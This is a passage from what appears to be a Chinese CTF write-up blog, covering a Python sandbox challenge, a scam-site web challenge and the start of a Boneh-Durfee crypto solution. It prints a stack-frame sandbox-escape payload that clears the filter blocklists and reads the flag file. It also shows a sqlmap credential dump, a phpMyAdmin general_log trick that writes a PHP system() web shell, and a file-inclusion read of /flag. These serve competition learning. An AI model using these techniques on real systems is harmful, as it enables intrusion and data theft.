class="hljs-subst">&#123;command&#125;</span>&quot;</span>)  <br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;&quot;</span>)<br>            <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_expression</span>(<span class="hljs-params">self, expression</span>):  <br>        <span class="hljs-keyword">for</span> var, value <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.variables.items():  <br>            expression = expression.replace(var, <span class="hljs-built_in">str</span>(value))  <br>        <span class="hljs-keyword">try</span>:  <br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(expression, &#123;&#125;, &#123;&#125;)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;执行出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <br>            <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_executer</span>(<span class="hljs-params">self, expression</span>):    <br>        <span class="hljs-keyword">global</span> audit_enabled<br>        output = <span class="hljs-string">&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_code</span>(<span class="hljs-params">code</span>):<br>            outputIO = StringIO()<br>            <span class="hljs-keyword">with</span> redirect_stdout(outputIO):<br>                <span class="hljs-built_in">exec</span>(code, &#123;<br>                    <span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>,<br>                    <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span><br>                &#125;, <span class="hljs-literal">None</span>)<br>            output = outputIO.getvalue()<br>            <span class="hljs-keyword">return</span> output<br>            <br>        <span class="hljs-keyword">for</span> var, value <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.variables.items():  <br>            expression = expression.replace(var, <span class="hljs-built_in">str</span>(value))  <br>            <br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.clever_checker(expression) == <span class="hljs-literal">False</span>:<br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;大傻春 你要干什么！&quot;</span>)<br>            <br>        code = <span class="hljs-built_in">compile</span>(expression, <span class="hljs-string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)<br>        <span class="hljs-comment"># 启用审计</span><br>        audit_enabled = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">try</span>:  <br>            output = exec_code(code)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;执行出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)  <br>        <span class="hljs-keyword">finally</span>:<br>            <span class="hljs-comment"># 关闭审计</span><br>            audit_enabled = <span class="hljs-literal">False</span><br>            <br>        <span class="hljs-keyword">return</span> output<br>            <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checker</span>(<span class="hljs-params">self, code</span>):<br>        allow_chr = <span class="hljs-string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> code:  <br>            <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> allow_chr:  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">clever_checker</span>(<span class="hljs-params">self, code</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">simple_checker</span>(<span class="hljs-params">source</span>):<br>            <span class="hljs-keyword">try</span>:<br>                source.encode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>            <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>            <span class="hljs-keyword">for</span> dangerous <span class="hljs-keyword">in</span> dangerous_strings:<br>                <span class="hljs-keyword">if</span> dangerous <span class="hljs-keyword">in</span> source.lower():<br>                    <span class="hljs-built_in">print</span>(dangerous)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">opcode_checker</span>(<span class="hljs-params">code</span>):<br>            <span class="hljs-keyword">from</span> dis <span class="hljs-keyword">import</span> dis<br>            <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><br>            opcode_output = StringIO()<br>            dis(code, file=opcode_output)<br>            opcodes = opcode_output.getvalue().splitlines()<br>            opcode_output.close()<br><br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> opcodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(opcode <span class="hljs-keyword">in</span> line <span class="hljs-keyword">for</span> opcode <span class="hljs-keyword">in</span> dangerous_opcodes):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(func <span class="hljs-keyword">in</span> line <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> allowed_functions):<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(opcode <span class="hljs-keyword">for</span> opcode <span class="hljs-keyword">in</span> dangerous_opcodes <span class="hljs-keyword">if</span> opcode <span class="hljs-keyword">in</span> line))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <br>        <span class="hljs-keyword">return</span> simple_checker(code) <span class="hljs-keyword">and</span> opcode_checker(code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_wrapper</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">audit</span>(<span class="hljs-params">event, args</span>):<br>        <span class="hljs-keyword">global</span> audit_enabled, dangerous_operation_detected<br>        dangerous_operation_detected = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> audit_enabled:<br>            event_info = event + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(arg) <span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> args)<br>            event_info_lower = event_info.lower()<br>            <span class="hljs-keyword">for</span> dangerous <span class="hljs-keyword">in</span> dangerous_operations:<br>                <span class="hljs-keyword">if</span> dangerous <span class="hljs-keyword">in</span> event_info_lower:<br>                    <span class="hljs-keyword">global</span>  dangerous_operation<br>                    dangerous_operation_detected = <span class="hljs-literal">True</span><br>                    dangerous_operation = dangerous<br>                    <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">return</span> audit<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">executer</span>(<span class="hljs-params">code</span>):<br>    outputIO = StringIO()<br>    interpreter = CleverInterpreter()  <br>    <span class="hljs-keyword">with</span> redirect_stdout(outputIO):<br>        interpreter.interpret(code)<br>    output = outputIO.getvalue()<br>    <span class="hljs-keyword">if</span> dangerous_operation_detected:<br>        output = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;危险操作: &quot;</span> + dangerous_operation)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span>(output)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:  <br>    addaudithook(block_wrapper())<br>    app.run(debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">80</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考文章<a href="https://www.cnblogs.com/gaorenyusi/p/18242719">https://www.cnblogs.com/gaorenyusi/p/18242719</a></p><p>考察的是python栈帧沙箱逃逸(妹听过啊)</p><p>三个安全模块是通过遍历下面三个列表对代码进行过滤的，而通过栈帧逃逸，我们可以访问到全局变量，因此只需要获取到全局变量表，将下面三个列表设为空即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">dangerous_operations = [<br>    <span class="hljs-string">&quot;marshal&quot;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;interpreter&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <br>    <span class="hljs-string">&quot;cpython&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;gc&quot;</span><br>]<br>dangerous_strings = [<span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>]<br>dangerous_opcodes = [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>]<br></code></pre></td></tr></table></figure><p>注意要把题目里的print闭合，官p说的是在前面的改</p><p>先输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">sentence = <span class="hljs-string">&quot;&quot;&quot;0)</span><br><span class="hljs-string">def exp():</span><br><span class="hljs-string">    def scq():</span><br><span class="hljs-string">        yield scq.gi_frame.f_back</span><br><span class="hljs-string">    scq = scq()</span><br><span class="hljs-string">    frame = [x for x in scq][0]</span><br><span class="hljs-string">    frame.f_back.f_back.f_back.f_globals[&quot;dangerous_operations&quot;] = []</span><br><span class="hljs-string">    frame.f_back.f_back.f_back.f_globals[&quot;dangerous_opcodes&quot;] = []</span><br><span class="hljs-string">    frame.f_back.f_back.f_back.f_globals[&quot;dangerous_strings&quot;] = []</span><br><span class="hljs-string">exp()</span><br><span class="hljs-string">print(0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/27.png" alt="27"></p><p>设置完成后就可以直接读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">sentence = <span class="hljs-string">&quot;&quot;&quot;0)</span><br><span class="hljs-string">def exp():</span><br><span class="hljs-string">    def scq():</span><br><span class="hljs-string">        yield scq.gi_frame.f_back</span><br><span class="hljs-string">    scq = scq()</span><br><span class="hljs-string">    frame = [x for x in scq][0]</span><br><span class="hljs-string">    gattr = frame.f_back.f_back.f_back.f_globals[&quot;_&quot;*2+&quot;builtins&quot;+&quot;_&quot;*2]</span><br><span class="hljs-string">    open = gattr.open</span><br><span class="hljs-string">    print(open(&quot;/fl44gggg&quot;, &quot;r&quot;).read())</span><br><span class="hljs-string">exp()</span><br><span class="hljs-string">print(0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/28.png" alt="28"></p><p>只是浮现了一下，知识点会放在学习计划中</p><h3 id="可恶的骗子"><a class="markdownIt-Anchor" href="#可恶的骗子"></a> 可恶的骗子</h3><p>官方给了两个解法都学习一下</p><h4 id="0x01"><a class="markdownIt-Anchor" href="#0x01"></a> 0x01</h4><p><img src="/../../images/shctf/2024/29.png" alt="29"></p><p>聊天记录内url拼接到靶机，显示用手机打开，使用手机ua进行访问</p><p>ClickID参数单引号报错，存在sql注入</p><p>构造一个ua头</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Xianyu_goods/index.php?ClickID=161<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>加个单引号发现有sql的报错</p><p>用sqlmap跑一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py -u http://210.44.150.15:36930/Xianyu_goods/index.php?ClickID=161 --user-agent=<span class="hljs-string">&#x27;Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36&#x27;</span> -D root -T admin_user --dump<br></code></pre></td></tr></table></figure><p>最后的数据是</p><img src="/../../images/shctf/2024/30.png" alt="30" style="zoom:80%;"><p><code>root::shctf_xianyu_password</code>登入后台</p><p>具体getshell流程可以参考这篇<a href="https://cloud.tencent.com/developer/article/1540506">phpMyAdmin利用日志文件GetSHELL-腾讯云开发者社区-腾讯云</a></p><p>登陆后使用日志写入php代码，首先启用日志</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Set global general<span class="hljs-emphasis">_log = on;</span><br></code></pre></td></tr></table></figure><p>接着设置日志路径，扫描后发现Xianyu_goods下有go.php</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Set global general<span class="hljs-emphasis">_log_</span>file = &#x27;/var/www/html/Xianyu<span class="hljs-emphasis">_goods/go.php&#x27;;</span><br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select &#x27;&lt;?php system(&quot;cat /flag&quot;); ?&gt;&#x27;;<br></code></pre></td></tr></table></figure><p>最后进入对应界面就好了</p><p><img src="/../../images/shctf/2024/31.png" alt="31"></p><h4 id="0x02"><a class="markdownIt-Anchor" href="#0x02"></a> 0x02</h4><p>根据聊天记录，网上搜索仿咸鱼 转转 交易猫系统源码等关键字，找到此系统源码</p><p>下载后使用工具进行审计，发现index.php存在文件包含，通过HTTP参数控制</p><p>文件自己审查一下，用常用的工具审一遍。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Xianyu_goods/index.php?ClickID=161&amp;HTYP=/flag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024网鼎杯青龙组初赛(个人)</title>
    <link href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF/2024/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF/2024/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>前言:没什么好写的，自己基本零输出，原来不打算写的，到底还是抄个冷饭吧。只写写我这里有的wp，关注我的<a href="https://www.n0o0b.com/">n0o0b</a>鸽鸽的博客说不定能蹲到其他的。</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="crypto1"><a class="markdownIt-Anchor" href="#crypto1"></a> crypto1</h3><p>可能这就是原题杯的魅力吧，每个方向都有原题，该题最近的一次出现是2023年的领航杯的密码题，原题应该是一场国际赛的密码题</p><p>题目是p和q两个的同时高位泄露,e未知，直接上exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br>time.clock = time.time<br><br>debug = <span class="hljs-literal">True</span><br><br>strict = <span class="hljs-literal">False</span><br><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):<br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>        <span class="hljs-built_in">print</span>(nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii, jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-comment"># print (a)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):<br>    <span class="hljs-comment"># 我们从当前 = n-1（最后一个向量）开始</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># 开始从后面检查</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#  如果它没有用</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># 让我们检查它是否影响其他向量</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># 如果另一个向量受到影响：</span><br>                <span class="hljs-comment"># 我们增加计数</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># 等级：0</span><br>            <span class="hljs-comment"># 如果没有其他载体最终受到影响</span><br>            <span class="hljs-comment"># 我们删除它</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># print (&quot;* removing unhelpful vector&quot;, ii)</span><br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># 等级：1</span><br>            <span class="hljs-comment"># 如果只有一个受到影响，我们会检查</span><br>            <span class="hljs-comment"># 如果它正在影响别的向量</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># 如果它影响哪怕一个向量</span><br>                    <span class="hljs-comment"># 我们放弃这个</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># 如果没有其他向量受到影响，则将其删除，并且</span><br>                <span class="hljs-comment"># 这个有用的向量不够有用</span><br>                <span class="hljs-comment"># 与我们无用的相比</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(<br>                        bound - BB[ii, ii]):<br>                    <span class="hljs-comment"># print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):<br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)  <span class="hljs-comment"># 多项式环</span><br>    Q = PR.quotient(x * y + <span class="hljs-number">1</span> - u)  <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX * YY + <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-移位</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># 单项式 x 移位列表</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():  <span 